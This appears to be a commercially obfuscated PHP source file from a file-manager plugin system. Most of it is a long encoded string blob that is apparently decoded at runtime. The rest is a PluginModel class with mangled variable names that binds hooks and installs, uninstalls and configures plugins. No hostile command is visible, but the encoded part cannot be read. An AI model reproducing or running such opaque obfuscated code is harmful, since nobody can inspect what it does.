."\257\14\112\106\211\147\275\60\366\52\140\151\205\355\152\57\275\145\350\262\73\242\362\143\245\172\64\334\36\146\243\215\121\261\130\272\5\277\160\66\361\164\313\226\31\374"."\153\21\263\302\343\327\242\31\55\10\152\271\163\45\202\134\252\306\327\2\137\264\11\55\236\207\216\13\370\210\363\155\6\200\134\174\213\245\353\216\51\17\310\46\343\24".base64_decode('fRDCMRW5hUTMtmMQAD80E/YVDhxNjQ7anRlnojMyDbpS6vw9a6CqC76MAF+ZUA==')."\x85\xbb\x8c\x72\x9c\x32\x6\xf9\x78\x37\xbb\x18\x8\x49\x96\xe1\xec\x53\xe9\x10\x9c\xc5\xdc\x1e\x90\x63\xdf\xa8\x8c\x3c\x7c\x44\x45\xbb\x83\x1e\xa7\xa1\x76\x65\x9d\x72\xba\x4b\x3\x4c"."\102\52\103\241\162\267\45\235\373\325\312\151\151\225\272\67\351\161\202\117\10\151\70\63\250\234\22\176\170\202\303\174\222\301\210\301\142\42\136\40\322\310\316\0\41\1"."\x6e\xb4\xa1\x21\x3\x32\x8f\x69\x61\xd4\x89\x6a\x69\x2c\x71\x3\xd8\x0\xb8\x35\xe1\xfa\xa\x75\xec\xc6\x6f\xb5\xc2\xfd\x1e\x79\xbe\xc3\x51\x87\xc4\x9d\x8a\x52\x51\xb4\x38\x33\x2\x25".base64_decode('IOE+DiUamW5+FprpZudSccsmCvcrHtOFfZJ48ARpdQP0mJncnqkbgBtdAccGrw==')."\230\212\116\120\75\155\341\261\316\306\46\117\275\23\220\276\321\343\306\263\15\250\63\2\166\40\212\113\162\237\61\226\362\305\30\62\152\274\224\322\250\35\332\131\205\56"."\xc7\xce\xb2\xba\xda\xc3\x40\xec\x31\xb\xc8\x6b\x9\x78\x5e\x47\x39\x1e\xc\xb5\x21\xf\x6\x72\x1e\x1e\xc7\xb1\x27\x16\x7a\x2c\x9e\x92\x59\x83\x61\x37\x70\xa8\xd8\x77\x67\x17\xfd\xee".base64_decode('7GLfnW377uzC72KQDUnlXK4eu/YUqYkFFBcjlOIm4emkeKpJJFNsdOQCyV7M/A==')."\x25\x58\x7e\x83\x87\xd8\x42\x48\xa\x4b\xc4\x52\x9d\x8b\x90\xa6\x4\x25\xf0\x6\x25\xf0\x69\xd9\x30\x21\x67\xfc\x7f\xe1\x18\xf\x5e\xc4\x6d\x62\xec\x3a\xe3\xb1\xdc\x9a\x61\xb8\xa1\x13"._kodDe('LLYSpEvl1YpS1JxvnhC096WC2xpqMFOKzCn52OBd/2JCucqdYPj1xcvh9/UJOMQ=')._kodDe('MLM0jcX6weIzhiZ+PhhBZ2RePYW96X/fD0SPcPMskbHY4jzy9rr1n4f4JmXbnHA=').base64_decode('2xzbGYrSTQUhgVlmwmsLc1hn7w4kBZwO6sy9IdawO4sCnMJ1WEwNBHeXoF2kag==').base64_decode('2EyyflNobKjAi39+X6zXTp37FARziR3RzlAGqHc+2wqwOfTrnNbZ1BkRh8nU5Q==')."\144\22\64\133\360\21\146\151\313\257\271\34\44\172\244\263\213\72\31\44\211\210\3\166\203\34\320\253\105\137\224\141\47\362\101\135\4\77\147\102\70\301\320\44\67\6".base64_decode('yuUFZ+giTsDdmbmuhgIu9vRIyQLywEg8tjKXiGB4snUatU1eWAKwraS65Kwy8A==')."\133\136\342\50\201\214\22\212\303\231\202\0\324\216\222\352\263\312\120\240\234\334\6\137\100\15\101\271\313\63\176\156\101\104\333\132\331\64\5\215\133\55\32\15\270\276"."\x47\xbb\x47\xbb\xfb\xc8\x9a\xaf\xed\x81\x5f\xe4\x2e\x97\xed\x74\xbe\x3f\xa\x48\x1b\xd5\x40\x45\x45\x2\x4b\x48\x37\x19\x75\x31\xa5\x91\xb5\x84\x92\xde\x26\xef\x38\x4a\x29\x3d\x4d\xbf"."\167\162\47\204\123\152\373\63\151\211\110\75\65\245\125\256\312\122\211\172\354\256\51\155\215\64\70\47\226\326\116\75\152\112\75\322\277\233\112\23\124\240\103\7\217\130"."\30\235\112\24\146\123\340\22\142\21\267\65\66\130\131\102\211\62\362\2\55\13\266\63\100\205\62\256\70\31\314\126\106\251\270\137\310\254\142\366\151\72\71\134\40\104".strrev('œ_Éæµ¨PüÖ•´?68gE†v$PgÈšß»FWPÕ°k¢ùtŠ	oXått')."\223\210\14\17\142\277\301\325\222\350\114\132\360\272\347\204\373\76\136\171\124\277\102\140\220\62\122\220\52\372\60\244\170\15\311\136\324\112\366\316\261\265\27\16\265\23"."\360\122\20\377\301\242\2\133\254\251\24\313\142\365\130\154\367\143\154\37\5\124\4\116\256\123\164\220\334\17\30\151\230\14\135\253\72\341\374\72\325\304\140\51\174\121".base64_decode('F21qnKBKsSyteTVh/yQ6z3Hm8/SDRSsV2XyaAXXCz+qzMNxAQHcyHtvOsws6zA==')."\x42\xe7\xa4\x60\xf1\x4a\xa3\xc7\x54\x8f\x9b\x4\xfe\x12\xf2\x48\x8f\xa3\xf2\x39\xb3\x86\x5\xa9\xf3\xd2\x11\xee\x24\xa5\x3\xdc\xbd\x31\xed\x1b\x9c\x70\x8b\xc7\x56\x1\xcc\x87\x91\xad"."\160\112\100\54\371\170\153\55\316\261\111\107\261\374\50\370\251\105\312\126\274\222\340\371\154\224\371\375\55\102\111\23\12\61\351\127\263\144\153\25\14\12\331\204\164\321".base64_decode('gM7yy3yJxNLdvCcxaOVGMLwbNFTjrBTaVgXNZjyVz3bXCImSqWlSRs4OECZ/pA==')."\x51\x3d\xd2\x98\xc\x3f\x54\x33\xd2\x35\x36\x69\x80\x8\xa1\xd7\xcc\x7d\x1b\xdc\x47\xb8\x1b\x24\xec\x6e\x80\xa4\x60\xd5\xb2\xb\x3a\xd5\x76\xc1\x4d\x2a\x94\x17\x9e\x9\xb0\xda\xa8\x46"."\301\336\144\73\37\20\237\37\151\111\347\231\7\346\34\12\223\56\265\4\132\247\371\233\205\63\150\1\20\255\367\66\107\75\55\55\105\23\30\27\3\65\134\360\344\306"."\65\237\76\62\20\247\150\70\105\315\164\111\161\150\160\132\123\2\241\45\222\241\307\251\327\273\22\67\41\274\50\3\227\243\246\250\244\110\51\54\42\45\101\237\234\50"."\204\223\113\247\116\161\253\123\331\354\160\327\13\272\306\355\151\135\356\63\241\124\345\206\307\273\331\263\41\72\210\247\115\10\332\300\35\55\110\322\24\131\302\3\137\123"."\12\317\336\222\245\122\12\154\340\314\200\145\252\275\160\63\75\334\230\342\226\305\104\270\24\103\32\345\211\231\144\325\313\264\314\105\325\347\236\270\315\165\162\275\234\235".strrev('„’o_¾AD7xääïbáH"ø*`O=i¹¸Ò7~aoÅ‘&xI‹ŠîVXU').base64_decode('KLfgBIvDX1M4TwPNBh+FcqvO/ZgvXIgrgizC4sWFMGKGY0/y5FQ7CGKOHQZFbw==').base64_decode('DgMbn/UzGGvFTBxC8+BfXibQPI1H8NKyJHZQizcU6+wodVUsXuxW6Tl2Z4m1rA==').strrev('×(ÓC˜”;jf¦»ğKWŸ¾ÜÜ£¾,9Ã19ì'."\0".'‘–z	è?5—NñÆå‹')."\250\126\115\244\323\277\40\345\214\264\261\140\175\63\347\213\31\222\143\172\342\102\152\23\217\325\1\137\155\57\363\267\215\107\125\14\173\162\71\61\112\335\316\43\5\171"."\132\215\271\331\152\307\112\163\127\234\33\272\323\54\210\326\330\340\360\260\331\226\0\355\321\21\270\27\120\117\300\246\315\267\303\101\135\14\310\2\123\214\270\256\346\114"."\xb\x9d\xc2\xef\xeb\x94\x20\xf\xe9\xf3\xe5\x5e\x19\x67\x29\x91\xe8\x7b\x1d\x25\xc8\x1f\x6c\x9\xa0\x4b\x38\x85\x10\x4\xde\x94\x29\x90\x0\x49\xba\x92\xae\x29\x41\xcd\x35\x52\x8a\x2".strrev('öÉg¿ÅÎg`ğ‚PäÍ=UlD5 ›y4µ™)Ø›¦#fFc©D‰` #ìS#Ê')."\xf8\x18\x46\x5a\xd1\xb1\x41\x1e\xa2\x3a\xe8\x98\x2a\xc9\x75\x5b\xe4\xa9\x84\x96\x50\x30\x12\xac\xa7\xde\xe6\x8b\x29\xc1\xc6\x52\x86\xd7\xc0\x96\xf8\x5c\x30\xa2\xc6\xd2\x33\x7c\xed\xd6"."\34\214\205\160\23\10\231\176\75\237\315\62\353\0\310\123\262\175\16\37\362\204\123\171\223\357\220\320\135\154\4\136\51\62\10\130\160\203\4\235\60\51\11\227\45\122"."\44\33\76\235\207\225\320\65\140\121\144\340\352\323\32\165\376\64\272\262\262\322\131\131\5\376\262\363\107\302\224\125\127\126\26\144\251\254\254\106\177\161\2\122\277\222"."\121\264\246\200\105\113\251\15\311\320\247\50\244\101\364\6\251\232\315\123\276\251\243\36\32\252\113\260\151\163\50\253\100\333\17\6\20\335\202\242\13\177\262\40\355\115"."\226\320\371\26\211\51\366\101\140\7\207\144\112\350\16\12\127\72\15\3\366\5\114\17\32\24\322\136\166\53\1\144\343\23\77\31\337\100\251\141\215\362\145\23\35\342"."\307\134\164\160\61\220\373\220\164\322\4\247\350\116\230\24\302\44\235\33\121\130\232\6\312\200\215\64\316\172\5\1\202\232\3\135\20\143\167\1\120\54\315\256\15\302"."\150\63\313\212\235\120\343\273\51\144\110\212\40\130\112\353\213\362\315\20\106\247\263\30\32\41\50\344\120\254\112\20\31\155\62\31\46\112\26\51\26\321\123\154\162\50"."\x8e\x2e\xca\x75\xab\x69\xcb\xd5\xa5\xa8\x50\xb7\x38\x38\x93\x61\x46\xd1\xf0\x3\x2c\x1a\xf\xf3\xb6\xd\x68\x13\x64\x94\x29\xa\x60\x8d\x7c\xd\x1f\x76\x17\x47\x1e\xe4\xb\x12\xbd\xf3"."\x83\x6d\x6b\xaa\x8f\x2a\x98\x1d\xd3\x3e\x33\x68\xd8\x75\x8d\xdf\x43\x2a\x78\x30\x8b\xc6\x84\xdb\x79\x54\x73\x1d\xfe\x2f\x26\x1c\x14\xe2\xa3\x0\x6c\xf4\x50\xcf\xdc\x49\x9\x15\xd8\x93"."\154\145\74\11\341\55\47\203\373\221\252\147\56\343\104\347\122\370\220\130\60\45\60\210\227\126\176\52\114\353\350\25\4\25\127\116\327\272\300\144\31\142\137\1\274\245".strrev('{k™ê$µh.İùY	æH‹~;Á¬ú%ëBO˜ë$YÌ/e˜8')."\xd1\xe\x0\x19\x28\x59\xeb\x80\x2\x8a\x15\xc2\x5a\xf6\x2b\xb8\x42\x25\x61\x93\x3c\x41\x25\xdc\x0\x23\xd9\x38\x25\x80\x5a\xa\x51\x5f\xaa\x6a\xd4\xc4\x0\x8e\x6\x3f\xee\xb3\xc2\x31".strrev('C‚æŠ¸'."\n".'ø¹>ÓY‹©«bÉW€6ÃÈaï7!úú¥TdkÑq¥Ë')."\310\324\152\242\116\31\16\137\124\124\31\300\105\327\310\36\135\52\202\164\126\304\52\300\40\244\161\206\25\124\63\372\44\304\200\370\103\71\244\4\155\157\117\136\241\134"."\235\100\314\44\223\223\62\102\170\42\51\135\63\115\361\226\256\47\41\120\340\200\270\247\107\160\21\347\124\376\35\313\21\224\340\361\221\145\5\173\11\375\272\114\367\27"."\x64\xf7\xe3\x42\x2e\x76\xb9\x10\x62\x8b\xda\x6d\x83\xd0\xee\x60\x52\xfa\x4f\x5d\x65\x66\xd9\xc3\x8\x70\x3a\xc3\x82\x69\x46\x91\x2f\x90\x42\xac\x8\xd9\xa4\x74\x25\xae\xe9\x48\x1a\xe5"."\xe8\x19\xcf\x9a\x21\xa5\x4b\x8c\x6\x34\x26\x85\xc3\x23\xf\xa5\x48\x15\xf0\x4e\xb9\x80\xe2\x10\xb\x80\x7c\x98\x17\x6f\xa8\xb\x9e\x36\x41\x4c\x70\x6d\x2a\x30\x1b\xce\x2a\x89\x71\x29"."\x51\x5c\x33\x8e\x8c\x12\x12\x50\xfe\x62\xc\x8b\x4d\x79\x24\xd8\x68\x22\xf1\x37\x9c\x8f\x31\x3d\xbd\x8d\x8d\xa0\x66\x9f\x92\xb8\x4b\x53\x3b\x4e\x58\x1\xba\xd5\xc\x7b\x60\x88\x69\xa0"."\x5a\xe8\xdb\x8f\xf7\x4c\x2c\x82\xbe\x59\x50\x4\xa7\xc1\x9d\x95\x1b\x7c\x8a\x29\x6\x90\x97\xe0\x50\xd\x9e\x52\xe4\x53\x28\x49\x18\xd1\x38\x73\x3c\x40\x46\x87\xf\x12\x49\x18\x50\xa8"."\371\227\263\152\264\223\172\132\21\155\101\311\346\113\306\27\362\267\2\32\100\56\234\322\101\142\313\105\362\361\74\232\360\370\22\272\1\314\57\67\242\313\316\154\76\321"."\255\150\26\323\205\175\113\141\166\136\350\172\260\110\126\370\71\64\66\377\202\31\132\213\245\343\21\202\311\136\213\165\234\55\3\130\31\326\164\342\62\65\143\171\114\23"."\340\201\305\304\302\126\11\161\221\53\272\205\105\245\170\77\270\241\41\0\151\330\61\253\60\60\374\74\35\137\234\246\26\222\214\56\161\160\104\143\300\302\63\171\27\263".strrev('…>®XšRÅ¬Ø"XiÈeMÄ3Ó3›†ì™€6®À4ÑçEŒJğåeG+ÈbW%')."\334\156\141\262\171\113\143\213\233\201\352\350\60\261\113\252\104\260\343\357\346\20\203\57\162\275\244\17\214\273\326\107\26\130\175\65\263\364\241\217\163\366\145\324\270\24"."\x8\x4e\xf3\xd7\x7b\x2\x5e\x7f\x78\x86\x4\x3d\x25\x70\x6b\x3\xe4\x6\xd9\xba\xdc\x91\xba\xa\x4f\xe\xc5\xfc\x18\xf3\x4\xc\x83\xce\x18\x60\x3c\x9d\x9\xc6\x8e\x1b\x9c\xf1\x16\xc"."\x80\x4\x47\xff\xd6\x6a\x31\x8e\x2a\x7a\x41\x8d\x80\x8d\xcf\x58\x9\x2\x2a\x3\x95\x70\x45\x72\xa7\xb9\x4e\x4a\xc8\x9c\xd3\x95\xc2\xfc\x3\xa\x7a\x61\x93\xb7\x58\x28\x90\x2f\xd2\x1a"."\222\277\370\27\300\22\261\346\6\233\265\222\35\254\361\152\266\127\65\124\116\34\150\211\1\261\166\256\146\324\231\63\352\204\350\273\132\230\1\76\330\370\53\205\156\73"."\210\103\6\321\21\253\115\154\306\323\44\372\167\311\121\55\73\171\56\206\273\103\107\121\301\121\175\116\227\125\103\21\0\330\143\172\105\71\215\11\116\137\110\351\50\56"."\203\141\41\370\342\344\377\272\162\65\301\375\76\330\232\246\46\350\211\74\263\347\307\116\174\353\305\27\157\150\23\12\274\351\377\127\277\374\16\256\247\217\242\333\360\364"."\261\13\364\354\56\71\65\141\47\322\121\354\40\201\177\2\10\146\372\100\116\74\331\161\47\250\63\161\52\50\102\227\63\76\252\261\205\21\316\345\302\354\244\66\370\71"."\54\347\0\251\13\36\161\120\176\230\252\113\300\202\46\303\156\71\331\264\275\60\140\67\340\263\74\63\131\360\15\150\122\65\170\75\240\234\304\165\11\54\203\124\43\125"."\42\25\25\177\164\102\232\102\357\23\361\117\40\147\16\276\114\316\264\210\162\215\242\1\256\60\304\30\200\270\17\316\276\103\363\20\55\63\120\0\260\250\24\2\264\135"."\xcc\x84\xc\x3a\x84\xce\x26\x35\x71\x18\x10\x1\x4\xfb\x8\x7e\x3d\x5\x9a\x55\xe3\x10\x16\x1e\x1d\x80\x11\x57\xcc\x42\xf\xf3\xb8\x9e\x41\x2b\x35\xec\x5b\x8\x67\x67\xa0\xdf\xfb\x94"."\xd6\x67\x7d\x10\x5\x42\xec\x9e\xee\x99\x8f\x7b\xcb\xb7\x60\x8a\x80\xcc\xe8\x56\xa9\xe8\xa2\x9f\x3a\x47\x7\x6c\xa3\xe5\x7d\x3\xa1\xf6\x91\xf8\xa7\x93\xfc\x52\x2a\x6f\xaf\x1a\xaf\x6b".base64_decode('0pRyNvf1lmevBUCTwuU5VAqe2svU8xzzrc8ePuHLi6YJKIWe2PAOUtQGlqz+wQ==')."\xb9\xdb\x75\xbe\x3\x59\x5d\x65\xb3\x73\x3a\x66\xb9\x85\x2c\xe8\x44\xc7\xe7\x11\x2d\x22\x77\x39\x30\xef\x3\x29\x10\x8f\xd5\xd\x88\x61\xd1\x58\x11\x75\x1a\x24\x52\xcd\x4a\x82\x61\xc0".base64_decode('VCEDfaMk4UAPaGA6ZH+kRVg/jLiJpbvSWkxOh7Dxj8WiXgdyCzPos2TDILecyw==')."\xd\x7a\x2c\x40\xf8\x11\x7c\x44\x90\xcf\xfa\xf1\xfd\x2d\xb\x54\x17\xe4\x22\xd1\x5c\x14\x1f\x86\xf0\x4b\x2a\x24\x3b\xf8\x5a\xb\x3e\xfd\x20\xdd\x16\xab\xa4\x27\x52\x4c\x4d\xd8\x20\xbc".base64_decode('suguPMGCxkmUvRFs98hhoksUXEgGaYrEJ9iyQCFCwFWPAmjVi4zur0AZHlqf8Q==')."\301\10\213\176\274\112\222\161\375\60\56\370\354\21\156\255\362\243\156\373\323\41\364\63\354\35\24\7\356\31\177\304\11\277\172\342\140\57\234\70\260\327\40\7\171\327"."\xc4\xc1\x2f\x1b\xfd\xda\x4b\x40\xfc\xf1\x34\xeb\x8b\x6b\xb0\xcd\xcc\xd8\xad\x80\xfd\xb6\x73\xde\x6c\xa8\x6c\x5\x42\xf6\x81\x8b\x68\x85\xfa\x38\x7e\x6e\x97\xcd\x67\xf8\x49\x28\x88\x58".base64_decode('JZGCDgs9zOtpBzq1dFAnLbbh4L0SZ6bIGP73OrDNIxIvElaqUz0lptOTH3s21Q==')."\202\165\100\250\347\106\367\330\207\125\301\343\3\355\231\304\350\61\343\46\211\142\74\237\37\176\242\102\235\47\342\37\162\254\103\166\164\76\361\222\25\255\44\352\77\113"."\134\276\50\321\152\225\132\370\16\221\215\20\377\357\26\0\147\205\161\126\301\106\264\360\121\262\202\201\100\270\50\130\126\10\333\230\355\124\134\203\207\325\6\137\105\170".base64_decode('4+KvD1m/hd/KKtIPYfvhCwI//qKloVCZgYpRU5et0lExIQCNBJU4VPQgoGJvOw==')."\x1a\x18\xa2\x3e\xe0\xc9\x82\x94\x20\xd6\x68\x6a\x76\xdd\x7\x2c\xe\xb7\x27\xa4\x7a\xb\x66\xd3\x64\xb3\x85\x77\x29\xf9\xd2\x12\x28\xcb\xff\x62\x2\xa9\x20\x80\x65\x6\x6e\x13\x51\xa4"."\347\356\163\50\371\50\362\270\217\160\260\374\53\355\306\254\26\23\172\234\262\351\24\20\122\320\227\51\146\20\115\60\341\131\270\14\146\355\253\255\172\120\214\327\61\307"."\41\15\226\251\220\367\22\336\0\342\176\46\4\106\13\226\246\227\266\6\21\141\51\215\22\137\67\62\123\234\305\307\53\324\262\132\5\257\164\342\55\26\124\221\270\14"."\xa\xab\x46\x5a\x11\xd2\x5e\xb2\x5c\x1b\x23\x91\x16\x7c\x51\xc9\x33\x8d\x5d\x5e\x92\x5\x93\x15\x38\x74\xc2\xe3\x5e\x9a\x18\xb6\xde\xc\xe\x52\x6f\x5d\x80\x35\xb2\x88\x57\x20\xee\xb5"."\275\377\206\110\216\375\121\70\332\177\264\316\71\45\23\156\301\131\204\0\366\146\210\105\50\60\354\217\347\0\46\112\164\306\7\242\14\303\311\226\111\150\35\62\37\306".base64_decode('X3PYnwTMCZeAbY+VCgpK6zOklsuC0COCbVnTK4iG7Xkr7AsNhyn//f/8ROD/rw==')."\x97\x1\xc7\x55\x52\x55\xb2\xe5\xf9\xb8\x69\x84\xad\xa5\x3c\xd8\x2\xc1\x15\x23\x56\x63\xda\xfa\x61\xdd\x18\x8f\x14\x53\x9\x86\x3a\x2c\x31\x12\xe1\xb\xe\xee\x38\x2e\xdb\x8b\xac\x2e".strrev('àïEİãU™›É—(ù£ÊøR,U'."\n".'½›²0¶<Õ¾iÓ‘&=2ÇPh=IOf')."\x4\xac\xee\x1\x5\xde\xa0\x20\x1b\xa7\x4f\x80\x85\xa0\x3e\x43\xdc\x34\x14\x87\xc2\x15\x64\x20\x29\x59\x14\xef\xb8\x5\x73\x54\xc\x2b\x27\x94\x78\xce\x39\x94\x7c\xa0\x5b\xb3\x84\x8a"."\x88\x94\xc3\x2\x2a\xa0\x37\x11\xcb\x2e\x68\x1\x8a\xc3\xc3\x9f\x46\x75\x59\x1f\xe7\x24\x25\x9a\x6c\x8f\x1e\xe1\x4c\x86\x38\xb6\x16\x1d\x72\xe1\x59\x6e\x61\x69\xb6\x98\xc5\x22\xd0\xbe".base64_decode('1KqJYS9CVtqfiKxyFn4Mm3dDLUIIyvkUIdExAzoGLFIGL8swzzMI+hdfhOw9Tw==')."\x41\xfc\x5\x21\xb1\xbf\x74\x31\xb7\xe8\x1a\x62\xc0\xac\x50\xa6\xcb\x10\x2c\xf5\x84\xe7\x9\xb\x1e\x18\xb3\xa9\xeb\x81\x50\xc4\xcf\xaf\x54\xd\x39\x26\x25\xdd\xe\xb7\x36\x95\xa1\x1b".strrev('6B¦¸¶Xµ2•ÖÒ¶„–¶[º!”M@KY`úô¡î%ÇXrfl=¼/OS'."\n".'')."\57\226\27\276\341\146\132\106\223\173\213\265\173\211\105\2\60\226\151\55\242\55\71\54\24\101\302\131\32\140\157\23\126\337\317\50\21\201\251\37\52\372\40\65\77\15"."\262\36\306\61\7\230\5\224\52\257\6\204\144\124\212\72\65\1\277\360\32\224\237\337\13\107\311\130\207\355\351\225\115\172\244\145\57\145\175\352\121\70\272\213\43\334"."\361\25\236\316\360\103\43\141\363\247\305\240\10\302\151\255\15\56\20\177\116\355\344\136\176\40\303\271\337\104\202\75\64\152\311\232\240\374\77\203\2\10\177\223\24\362".strrev('˜8ì â¤2vo±’Ñ÷X¬!7yæëP¥æü¡-1·‰sŠ_Ùô«›nJÍÂ:')."\x19\xb5\x8\x92\x6\x34\x4a\xe7\xd6\x2e\xb8\x2b\x4c\x7a\xe6\x9f\xb4\xde\x23\x65\xd9\xd8\x9c\x81\x3c\xe8\xa\x80\xd3\x2\xb5\xc9\x4e\x50\x17\x41\xb7\x71\x5b\x92\x21\xbe\xa1\x6a\x3d\x91"."\23\305\171\1\5\224\164\100\250\116\74\255\33\264\100\270\370\107\70\126\132\207\130\270\163\313\23\350\146\245\131\6\137\40\166\254\143\44\147\110\114\264\64\307\76\265"."\210\355\347\350\213\201\31\244\356\164\121\365\161\141\176\305\326\172\261\200\275\147\270\204\321\247\232\361\224\40\213\24\46\26\302\365\202\101\45\37\52\336\136\173\253\350"."\230\332\45\64\136\111\101\173\204\43\377\210\126\244\14\156\121\321\142\70\11\275\364\315\170\110\113\331\101\206\0\226\305\111\260\154\101\62\55\54\50\64\204\162\246\234"."\67\6\351\136\341\340\21\51\77\121\244\303\66\131\30\147\35\154\74\213\146\56\374\34\301\70\173\156\244\26\50\336\12\56\315\333\216\125\213\265\242\150\346\101\133\121"."\xe4\xf5\x62\xe2\xdf\xab\x8\xad\xa5\x29\x45\xa8\x2b\x3f\x83\x2f\xa4\xe3\x3c\xad\x88\x45\x0\xae\x13\xee\xd1\xa2\xe3\x98\x22\xc9\xa2\x79\x41\x71\x3\x84\x50\xd1\xa5\x6f\x58\x2d\x3\x6c"."\160\161\140\250\225\20\220\330\370\353\267\202\75\355\110\13\111\317\147\273\263\32\333\46\22\334\226\13\232\212\262\67\142\331\347\12\152\263\242\146\66\57\130\171\26\65"."\xef\x75\xa0\x37\xd1\xb\x24\xd9\xb4\x4c\xf5\xe3\x82\x5d\x34\x96\x5a\x34\x53\x8d\xb\xd6\x49\xf6\x57\xe0\x71\x3a\xfd\x48\x5a\x50\xc0\xd9\x74\x5f\x5c\xda\xb7\x1c\x50\x17\xd1\xe\x21\x10"."\x61\xd7\xb8\xaa\xd9\x62\x25\x8e\xf7\x7f\xa2\x63\xc7\x47\x6d\xf5\xf0\xa4\x95\x1d\xaf\x40\xf1\xca\x81\xf7\x4b\x9c\xc\x9f\xa5\x77\xc0\xb4\x88\x96\x43\xbf\x75\x9a\x69\x52\x4a\x2\xe4\x7f"."\x94\x13\x31\x79\x70\xd3\x73\x8\x96\x9\x20\xc4\xcf\x52\xe0\x28\x22\xf5\x3e\x42\x47\x44\x36\x50\x90\x1c\xfa\x41\x81\x33\xac\xe0\x54\x44\x6c\x2c\x11\x78\x6c\xc0\x22\xe2\x9e\x46\x4e\xea"."\32\362\266\343\106\16\0\102\144\114\353\247\136\332\340\165\125\336\36\376\264\254\154\147\344\70\17\102\360\115\264\263\100\227\202\15\67\116\161\23\257\267\116\124\207\223".strrev(',Ï;ÁmÃ„ñjH.8lßX_ •©'."\r".'ì'."\n".'¼“t@Õ¯á}™õÎÇ²ëŸ™?ø')."\110\106\245\4\223\226\202\244\226\306\140\363\140\151\276\46\217\77\120\220\6\115\134\232\243\334\215\17\116\362\267\240\126\172\2\201\140\333\140\255\360\327\317\340\55\101"."\7\252\134\345\235\113\151\124\223\115\117\6\302\162\232\312\322\302\305\65\45\303\375\71\361\62\126\25\201\70\257\6\165\165\306\2\126\27\363\66\153\63\212\260\244\42"."\150\236\322\114\352\16\345\10\24\72\23\145\213\233\61\313\250\103\242\125\33\77\62\166\131\316\231\5\70\132\54\210\304\10\110\50\356\256\10\120\121\164\304\104\375\151"._kodDe('MiqNkQv93hltmolv/eWUOEbDvMVPyHEPEhhPEMQczeo1vCsYGRrw7Irs').base64_decode('')."".strrev('').""."", 10, -8))); goto eïÜ·Ãæ¿Ì; Fò˜é¬Ï…ğ: class PluginModel extends ModelBaseLight { public $optionType = "\123\x79\163\164\145\155\56\x70\x6c\x75\x67\151\156\114\x69\163\x74"; public $field = array("\x6e\141\x6d\145", "\x73\164\x61\x74\x75\163", "\162\x65\147\x69\145\163\164", "\143\x6f\x6e\x66\151\x67"); public function loadList($E±ÂîÚ¦â = false) { $Dä¿ª÷Åºõ = array_to_keyvalue($this->listData(), $_SERVER[æ§›¦ÌáØ][28]); if ($E±ÂîÚ¦â) { return $Dä¿ª÷Åºõ[$E±ÂîÚ¦â]; } return $Dä¿ª÷Åºõ; } public function init() { $AÌêİ”Ê„ =& $_SERVER[æ§›¦ÌáØ]; Hook::trigger($AÌêİ”Ê„[1800]); $f–ÜÁø°ôñ = $this->loadPluginList(); foreach ($f–ÜÁø°ôñ as $C’ˆ‹ÆÍ¸ => $eĞ¼‰´Ö«) { $D‚”¿Ú“Àº = $this->appAllow($C’ˆ‹ÆÍ¸, $eĞ¼‰´Ö«); if (!$D‚”¿Ú“Àº) { continue; } foreach ($eĞ¼‰´Ö«[$AÌêİ”Ê„[1801]] as $Eä£êì‰Ú => $c¿ìÍÂøš) { Hook::bind($Eä£êì‰Ú, $c¿ìÍÂøš); } } Hook::trigger($AÌêİ”Ê„[1802]); Hook::trigger(ACTION); } public function appAllow($fŒ¨ã‡æ¤Õ, $FÚÛ¥ø•¶ß, $cçÙ‡ÒÁ“á = true) { $c¬‰ãÒ…ì =& $_SERVER[æ§›¦ÌáØ]; $fÁ‚«“ä°Ò = PLUGIN_DIR . $fŒ¨ã‡æ¤Õ . $c¬‰ãÒ…ì[1803]; if (!is_array($FÚÛ¥ø•¶ß) || !is_array($FÚÛ¥ø•¶ß[$c¬‰ãÒ…ì[1801]]) || $FÚÛ¥ø•¶ß[$c¬‰ãÒ…ì[703]] != 1 || !is_file($fÁ‚«“ä°Ò)) { return !1; } if ($GLOBALS[$c¬‰ãÒ…ì[485]] == 1) { return !0; } if ($cçÙ‡ÒÁ“á && !Action($c¬‰ãÒ…ì[1804])->checkAuth($fŒ¨ã‡æ¤Õ)) { return !1; } return !0; } public function unInstall($dØ¤ì…âéƒ) { $e½š×¯‡Œ— =& $_SERVER[æ§›¦ÌáØ]; $dººÂ· = $this->loadList($dØ¤ì…âéƒ); if (file_exists(PLUGIN_DIR . $dØ¤ì…âéƒ)) { Hook::apply($dØ¤ì…âéƒ . $e½š×¯‡Œ—[1805]); } $this->remove($dººÂ·[$e½š×¯‡Œ—[393]]); } public function changeStatus($dßÁ²Üğ‰í, $Bù‚ª–áî) { $d¯Š••ê¤ä =& $_SERVER[æ§›¦ÌáØ]; $Bß¿òÑÔƒ³ = $this->loadList($dßÁ²Üğ‰í); if ($Bù‚ª–áî) { Hook::apply($dßÁ²Üğ‰í . $d¯Š••ê¤ä[1806]); } $this->update($Bß¿òÑÔƒ³[$d¯Š••ê¤ä[393]], array($d¯Š••ê¤ä[1807] => $Bù‚ª–áî)); } public function appRegist($aÒÕ»¼˜¶ë, $dÃ‰é¸¾µ) { $B—¸„ŞÀ¤Ó =& $_SERVER[æ§›¦ÌáØ]; $D„¨ÑëŞ—™ = $this->loadList($aÒÕ»¼˜¶ë); if ($D„¨ÑëŞ—™) { $this->update($D„¨ÑëŞ—™[$B—¸„ŞÀ¤Ó[393]], array($B—¸„ŞÀ¤Ó[1801] => $dÃ‰é¸¾µ)); } else { $DÉÆ¤‹‹Ä˜ = array($B—¸„ŞÀ¤Ó[28] => $aÒÕ»¼˜¶ë, $B—¸„ŞÀ¤Ó[1801] => $dÃ‰é¸¾µ, $B—¸„ŞÀ¤Ó[703] => 0, $B—¸„ŞÀ¤Ó[6] => $this->getConfigDefault($aÒÕ»¼˜¶ë)); $this->insert($DÉÆ¤‹‹Ä˜); } } public function getConfigDefault($b›·‡»™«) { $Dˆñ—‘˜àñ =& $_SERVER[æ§›¦ÌáØ]; $d¸æîÙœÃ = array(); $D«¯Öˆ‹  = $this->getPackageJson($b›·‡»™«); if (!$D«¯Öˆ‹  && is_array($D«¯Öˆ‹ [$Dˆñ—‘˜àñ[1808]])) { return $d¸æîÙœÃ; } foreach ($D«¯Öˆ‹ [$Dˆñ—‘˜àñ[1808]] as $e¿á¶ŒÈù˜ => $cÆŠÅØ‹¹ˆ) { if (!isset($cÆŠÅØ‹¹ˆ[$Dˆñ—‘˜àñ[372]]) || isset($d¸æîÙœÃ[$e¿á¶ŒÈù˜])) { continue; } $d¸æîÙœÃ[$e¿á¶ŒÈù˜] = $cÆŠÅØ‹¹ˆ[$Dˆñ—‘˜àñ[372]]; } return 